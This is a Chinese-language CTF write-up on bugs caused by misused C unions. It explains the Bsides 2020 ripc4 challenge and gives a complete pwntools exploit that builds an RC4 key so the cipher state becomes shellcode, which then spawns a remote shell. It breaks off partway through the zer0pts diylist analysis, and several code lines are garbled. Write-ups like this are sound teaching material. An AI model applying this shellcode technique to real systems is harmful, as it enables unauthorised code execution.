## 前言
最近看一些国际赛的题目，遇到了一种之前没有见到过的漏洞，是关于`union`这个联合类型的错用，漏洞原理很简单，不过比较新奇，这里分享给大家。
题目文件在[这里](https://github.com/xmzyshypnc/xz_files/tree/master/union_file)
原题在[BUUCTF](https://buuoj.cn/challenges#zer0pts_2020_diylist)平台上有复现，感兴趣的同学可以去做下。
## 预备知识
其实也算不上预备知识，算是小常识，就是`union`类型的变量的内存区域是共享的，这也是为什么我们用`联合`这个类型而不是用结构体，它可以应用在多个变量中只用其一的场景中，这里以一个简单的demo举例，定义`union
var`，包含两个成员变量var1,var2，分别设置值并输出，可以看到二者`共享一块内存区域`，一旦我们修改其一变量，另一个变量的值也会变化，这为我们节省内存带来了便利，然而也造成了一些错用的风险。
    // gcc ./poc.c -o poc && ./poc
    #include 
    #include 
    #include 
    union var {
        char var1;
        unsigned int var2;
    };
    int main()
    {
        union var test;
        test.var1 = 'x';
        printf("[*]var1 %c @ %p\n",test.var1,&test.var1);
        test.var2 = 0x41414141;
        printf("[*]var2 0x%x @ %p\n",test.var2,&test.var2);
        //what about var1 now ?
        printf("[*]var1 %c @0x%p\n",test.var1,&test.var1);
        return 0;
    }
    /*
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/BesidesCTF2020/ripc4 ‹hexo*› 
    ╰─$ gcc ./poc.c -o poc && ./poc
    [*]var1 x @ 0x7fffffffe350
    [*]var2 0x41414141 @ 0x7fffffffe350
    [*]var1 A @0x0x7fffffffe350
    */
## Bsides CTF 2020 ripc4
### 程序分析
题目给了.c文件，不需要从IDA去看。首先看题目实现的功能，首先关注题目中核心的结构体，这样一个结构体用来表示不同类型的结构
开始需要我们设置ws的类型，这里的ws是通过`workspace_t *ws =
secure_malloc(sizeof(workspace_t));`分配的，我们稍后关注这个函数。
在类型设置完毕之后，我们可以对于不同类型的结构使用不同的功能。核心的逻辑如下，首先对于三种类型的结构，均可以使用`set_input`函数，用以向`input_buf`输入数据。而在使用`set_encoding`功能的时候，会检查是否为`TYPE_ENCRYPT`类型，是的话则不能使用。过检查后调用`set_encoding`函数。
    while (1) {
        print_menu(ws->type);
        char *cmd = prompt("command");
        if (!cmd) {
          printf("Exiting!\n");
          return 0;
        }
        if (CMD_IS("quit") || CMD_IS("exit")) {
          return 0;
        } else if (CMD_IS("set_input")) {
          set_input(ws);
          continue;
        } else if (CMD_IS("set_encoding")) {
          if (CHECK_TYPE(ws, TYPE_ENCRYPT)) {
            printf("No encoding for encrypted type!\n");
            continue;
          }
          set_encoding(ws);
          continue;
        } else if (CMD_IS("print")) {
          print_state(ws);
          continue;
        } else if (CMD_IS("set_key")) {
          if (!CHECK_TYPE(ws, TYPE_ENCRYPT)) {
            printf("Can only set key for encrypted type.\n");
            continue;
          }
          set_key(ws);
          continue;
        } else if (CMD_IS("encrypt")) {
          if (!CHECK_TYPE(ws, TYPE_ENCRYPT)) {
            printf("Can only encrypt for encrypted type.\n");
            continue;
          }
          do_encrypt(ws);
          continue;
        }
      }
所有类型的结构都可以调用`print`函数。在源码中`print_state`函数似乎做了类型检查，我们跟进去看一下这个宏，会发现只要`target->type
& t == t`即可。而`TYPE_ENCRYPT`为3，`3 & 2 ==
2`，是可以绕过这个检查从而调用`ws->print_encoded(ws->input_buf,
ws->buf_len);`的。而这个函数指针是作为`union`类型变量的一部分，其和`enc_state`是共享内存空间的，我们可以通过`set_key`和`do_encrypt`来设置这个变量，从而使得程序执行任意指令。
    #define CHECK_TYPE(ws, t) ((ws->type & t) == t)
    #define TYPE_PLAIN 1
    #define TYPE_ENCODE 2
    #define TYPE_ENCRYPT 3
    void print_state(workspace_t *ws) {
      if (CHECK_TYPE(ws, TYPE_ENCODE)) {
        if (!ws->print_encoded) {
          printf("Must use set_encoding first.\n");
          return;
        }
        ws->print_encoded(ws->input_buf, ws->buf_len);
      } else if (CHECK_TYPE(ws, TYPE_PLAIN)) {
        printf("%s\n", ws->input_buf);
      } else {
        printf("Printing not supported for encrypted data.\n");
      }
    }
只有`TYPE_ENCRYPT`可以调用`set_key`函数和`do_encrypt`函数。
以上是主要功能的分析，下面关注函数细节。
secure_malloc会分配一块可以执行的区域并返回。
    #define PROT_MASK (PROT_READ|PROT_WRITE|PROT_EXEC)
    #define PROT_RW (PROT_MASK|PROT_READ|PROT_WRITE)
    void *secure_malloc(size_t sz) {
      size_t pg_size = (size_t)sysconf(_SC_PAGESIZE);
      // Round size up
      sz = (sz + pg_size-1) & ~(pg_size-1);
      // Add guard pages
      sz += (pg_size  (KEY_LEN_MAX * 2) ||
          key_len > 1;
      // Allocate key data
      if (ws->enc_state) {
        secure_free(ws->enc_state);
        ws->enc_state = NULL;
      }
      ws->enc_state = secure_malloc(RC4_SZ);
      // Initial data
      for (int i=0;ienc_state[i] = i;
      }
      // Permute from key
      int j=0;
      for (int i=0;ienc_state[i] + key_data[i % key_len]) & 0xFF;
        char tmp = ws->enc_state[i];
        ws->enc_state[i] = ws->enc_state[j];
        ws->enc_state[j] = tmp;
      }
      memset(key_data, 0, key_len * 2);
      printf("Key has been set.\n");
    }
    void do_encrypt(workspace_t *ws) {
      // PRGA keystream
      int i=0, j=0;
      for(int k=0;kbuf_len;k++) {
        i += 1;
        i &= 0xFF;
        j += ws->enc_state[i];
        j &= 0xFF;
        int tmp = ws->enc_state[i];
        ws->enc_state[i] = ws->enc_state[j];
        ws->enc_state[j] = tmp;
        tmp = ws->enc_state[(ws->enc_state[i] + ws->enc_state[j]) & 0xFF];
        ws->input_buf[k] ^= tmp;
      }
      printf("Buffer encrypted!\n");
    }
### 漏洞分析
在程序分析部分我们已经找到了漏洞，即在`print_state`函数中可以执行任意代码，我们可以将其改为shellcode，之后通过调用`print`来触发shellcode执行。
具体如下。
我们输入构造好的Key，使得在初始化key数组以及enc_state数组时让enc_state为shellcode。构造的方式也并不难，我们只需要逆一下`set_key`对于`key`的变换，固定`enc_state`，从而得到输入的`key`。
另外rc4密钥变换的时候是遍历数组，将所有`enc_state`交换一遍，因为`enc_staet`被初始化为`[0,0xff]`，因此混淆之后的数组中不会出现两个相同的byte，如此一来，`/bin/sh`就不能用了，可以先构造个读取后续shellcode的sc，之后输入后面get
shell的sc即可。
调试到代码执行处下断点，看一眼寄存器的情况，发现我们只需要设置`rsi/rdx`即可。
### exp.py
    #coding=utf-8
    from pwn import *
    import random
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='DEBUG')
    context.terminal = ['tmux','split','-h']
    debug = 0
    elf = ELF('./ripc4')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./ripc4')
    else:
        p = remote('node3.buuoj.cn',28819)
    def exp():
        sla(p,"type (plain, encoded, encrypted)> ","encrypted")
        sla(p,"command> ","set_key")
        #get key
        state = range(256)
        target = range(256)
        sc = asm('''
                xor edi,edi
                mov rsi,rcx
                mov dh,0x4
                syscall
                ''')
        sc = list(sc)
        shellcode = [ord(item) for item in sc]
        target = filter(lambda c: not c in shellcode, target)
        target = shellcode + target
        sc = ''.join(chr(item) for item in shellcode)
        print disasm(sc)
        key_lis = range(256)
        j = 0
        for i in range(256):
            tg = target[i]
            target_idx = state.index(tg)
            temp = target_idx
            temp += 0x300
            temp -= j
            temp -= state[i]
            j = target_idx & 0xff
            key_lis[i] = temp & 0xff
            state[i],state[j] = state[j],state[i]
        key = ''.join(hex(item)[2:].zfill(2) for item in key_lis)
        print(key)
        sla(p,"key (hex)> ",key)
        #gdb.attach(p,'b* 0x0000555555554000+0x197c')
        sla(p,"command> ","print")
        #get more sc
        sc = '\x90'*len(sc)+asm(shellcraft.amd64.linux.sh())
        raw_input()
        p.sendline(sc)
        p.interactive()
    exp()
## zer0ptsCTF 2020 diylist
### 程序逻辑
漏洞环境为`ubuntu 18.04/2.27`，没有开`PIE`，`Partial RELRO`，有`canary/NX`保护。
还是典型的菜单题，共有`add/get/edit/del`四个功能。
程序维护了一个伪链表，名为list，实际上并不是传统意义的链表。成员`size`表示目前链表中的`item`数量，`max`指链表所能容纳的最大`item`数量。
    typedef struct {
      int size;
      int max;
      Data *data;
    } List;
    List* list_new(void)
    {
      List *list;
      list = (List*)malloc(sizeof(List));
      list->size = 0;
      list->max = 0;
      list->data = NULL;
      return list;
    }
另一个成员`data`是联合类型的，其成员有`p_char/d_long/d_double`。我们`add/edit`等操作的直接对象就是这样一个`data`类型的变量。
`add`函数向`list`中添加一个成员，这里的链表是用`malloc`进行分配的，因此它存储在堆上。首先确定用户输入的类型，如果是`long/double/str`则调用`read_long/read_double/read_str`读取变量，返回值强制转换为`Data`类型传给`list_add`函数。
`list_add`检查当前的`size`是否达到了`max`上限，是的话就为`list->data`分配一块更大区域存储数据，并将之前数据悉数拷贝至新区域。
如果是`long/double`类型，则直接插入到后面，如果是`str`类型则调用`strdup`将输入拷贝到堆并将堆地址写入到`list->data[size]`。然后将这个堆地址存储在全局变量`fpool`里。